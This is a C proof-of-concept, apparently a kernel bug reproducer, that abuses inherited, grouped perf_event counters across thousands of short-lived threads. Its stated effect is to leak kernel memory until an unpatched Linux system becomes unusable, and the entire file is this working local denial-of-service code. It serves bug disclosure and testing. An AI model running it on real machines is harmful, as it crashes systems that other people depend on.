/* pe_inherit_memleak.c  */
/* by Vince Weaver   vweaver1 _at_ eecs.utk.edu */

/* Each time run will leak hundreds of megabytes of kernel memory */

/* Compile with gcc -O2 -Wall -o pe_inherit_memleak pe_inherit_memleak.c -lpthread */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#include <unistd.h>
#include <asm/unistd.h>
#include <sys/prctl.h>
#include <linux/perf_event.h>

void *thread_work(void *blah) {
    
   return NULL;
}

int perf_event_open(struct perf_event_attr *hw_event_uptr,
		    pid_t pid, int cpu, int group_fd, unsigned long flags) {
 
   return syscall(__NR_perf_event_open, hw_event_uptr, pid, cpu, group_fd,flags);
}

int main(int argc, char** argv) {
   
   int i,fd1,fd2;

   struct perf_event_attr pe;

   printf("\nOn unpatched kernels, unfreeable memory will leak until\n");
   printf("\tthe system is unusable.\n\n");
   
   memset(&pe,0,sizeof(struct perf_event_attr));

   pe.type=PERF_TYPE_HARDWARE;
   pe.config=PERF_COUNT_HW_CPU_CYCLES;
   pe.disabled=1;
   pe.inherit=1;
   pe.exclude_kernel=1;
   pe.exclude_hv=1;
   
   fd1=perf_event_open(&pe,0,-1,-1,0);
   if (fd1<0) {
      fprintf(stderr,"Error opening\n");
      exit(1);
   }
   
   pe.type=PERF_TYPE_HARDWARE;
   pe.config=PERF_COUNT_HW_INSTRUCTIONS;
   pe.disabled=0;
   pe.inherit=1;
   pe.exclude_kernel=1;
   pe.exclude_hv=1;
   
   fd2=perf_event_open(&pe,0,-1,fd1,0);
   if (fd2<0) {
      fprintf(stderr,"Error opening\n");
      exit(1);
   }
       
   for(i=0;i<10000;i++) {
      
      int j;
      pthread_t our_thread[8];
      
      for(j=0;j<8;j++) {
         pthread_create(&our_thread[j],NULL,thread_work,0);	 
      }
      
      for(j=0;j<8;j++) {
         pthread_join(our_thread[j],NULL);	 
      }
      
   }
   
   return 0;
}
